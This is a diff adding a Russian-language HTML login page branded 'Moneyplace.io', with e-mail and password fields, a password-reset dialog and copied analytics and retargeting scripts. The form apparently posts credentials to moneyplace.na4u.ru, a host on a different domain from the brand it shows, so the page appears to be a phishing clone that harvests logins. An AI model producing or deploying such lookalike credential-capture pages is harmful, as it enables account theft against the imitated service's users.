@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Moneyplace.io | Вход</title>
+
+    <link href="css/libs/bootstrap/bootstrap.min.css" rel="stylesheet">
+    <link href="css/libs/font-awesome/font-awesome.css" rel="stylesheet">
+    <link href="js/libs/toastr/toastr.min.css" rel="stylesheet">
+    <link href="css/libs/animate/animate.css" rel="stylesheet">
+    <link href="css/style.css" rel="stylesheet">
+    <link href="css/mobile.css%3Fid=1.css" rel="stylesheet">
+    <meta name="facebook-domain-verification" content="94euyc6kigy2c1is8y7tm2ob7jqwsh" />
+
+    <link rel="icon" type="image/png" href="favicon.png%3Fid=1">
+
+</head>
+
+<body class="gray-bg">
+
+<div class="middle-box text-center loginscreen animated fadeInDown">
+    <div>
+        <div>
+            <h1 class="logo-name">moneyplace.io</h1>
+        </div>
+        <h3>Вход</h3>
+        <form class="m-t" id="login" role="form" action="https://moneyplace.na4u.ru/auth/auth.php">
+            <div class="form-group">
+                <input type="text" class="form-control" name="login" placeholder="E-mail" required="">
+            </div>
+            <div class="form-group">
+                <input type="password" class="form-control" name="password" placeholder="Пароль" required="">
+            </div>
+            <button type="submit" class="btn btn-primary block full-width m-b">Вход</button>
+
+            <a href="index.html#" id="change-password"><small>Забыли пароль?</small></a>
+            <p class="text-muted text-center"><small>Нет аккаунта?</small></p>
+            <a class="btn btn-sm btn-white btn-block" href="/register.html">Регистрация</a>
+        </form>
+    </div>
+</div>
+
+<!-- Mainly scripts -->
+<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@2/dist/fingerprint2.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bowser@2.5.3/es5.min.js"></script>
+<script src="js/libs/jquery/jquery-3.1.1.min.js"></script>
+<script src="js/libs/popper/popper.min.js"></script>
+<script src="js/libs/bootstrap/bootstrap.js"></script>
+<script src="js/libs/toastr/toastr.min.js"></script>
+<script src="js/common.js%3Fid=13"></script>
+<script src="js/login.js%3Fid=15"></script>
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+    (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+        m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+    (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+    ym(69943126, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+    });
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/69943126" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+
+<script type="text/javascript">!function(){var t=document.createElement("script");t.type="text/javascript",t.async=!0,t.src="https://vk.com/js/api/openapi.js?169",t.onload=function(){VK.Retargeting.Init("VK-RTRG-977719-7Ssal"),VK.Retargeting.Hit()},document.head.appendChild(t)}();</script><noscript><img src="https://vk.com/rtrg?p=VK-RTRG-977719-7Ssal" style="position:fixed; left:-999px;" alt=""/></noscript>
+<!-- Facebook Pixel Code -->
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+        n.queue=[];t=b.createElement(e);t.async=!0;
+        t.src=v;s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s)}(window, document,'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '245291500264702');
+    fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+               src="https://www.facebook.com/tr?id=245291500264702&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Facebook Pixel Code -->
+
+<!-- Global Site Tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-163314472-10"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-163314472-10');
+    gtag('config', 'G-RVC65QY67H');
+</script>
+
+
+<!-- modal -->
+
+<div class="modal inmodal" data-keyboard="false" data-backdrop="static" id="modal" tabindex="-1" role="dialog" style="display: none;" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content animated flipInY">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">×</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title">Восстановление пароля</h4>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <input type="text" class="form-control" value="" name="new_password" placeholder="Введите новый пароль">
+                    <input type="hidden" class="form-control" value="" name="code" placeholder="код">
+                </div>
+                <div class="form-group">
+                    <input type="text" class="form-control" value="" name="repeat_password" placeholder="Повторите пароль">
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-primary" id="save-data">Изменить пароль</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script type="text/javascript">
+    var __cs = __cs || [];
+    __cs.push(["setCsAccount", "PTm89skDrWo66w13ivzfxcAQG6CDUqeV"]);
+    </script>
+    <script type="text/javascript" async src="https://app.comagic.ru/static/cs.min.js"></script>
+
+<script type="text/javascript">!function(){var t=document.createElement("script");t.type="text/javascript",t.async=!0,t.src="https://vk.com/js/api/openapi.js?169",t.onload=function(){VK.Retargeting.Init("VK-RTRG-1002893-hs8Hj"),VK.Retargeting.Hit()},document.head.appendChild(t)}();</script><noscript><img src="https://vk.com/rtrg?p=VK-RTRG-1002893-hs8Hj" style="position:fixed; left:-999px;" alt=""/></noscript>
+<!-- Rating Mail.ru counter -->
+<script type="text/javascript">
+    var _tmr = window._tmr || (window._tmr = []);
+    _tmr.push({id: "3222448", type: "pageView", start: (new Date()).getTime()});
+    (function (d, w, id) {
+        if (d.getElementById(id)) return;
+        var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true; ts.id = id;
+        ts.src = "https://top-fwz1.mail.ru/js/code.js";
+        var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);};
+        if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); }
+    })(document, window, "topmailru-code");
+</script><noscript><div>
+    <img src="https://top-fwz1.mail.ru/counter?id=3222448;js=na" style="border:0;position:absolute;left:-9999px;" alt="Top.Mail.Ru" />
+</div></noscript>
+<!-- //Rating Mail.ru counter -->
+
+</body>
+
+</html>
+
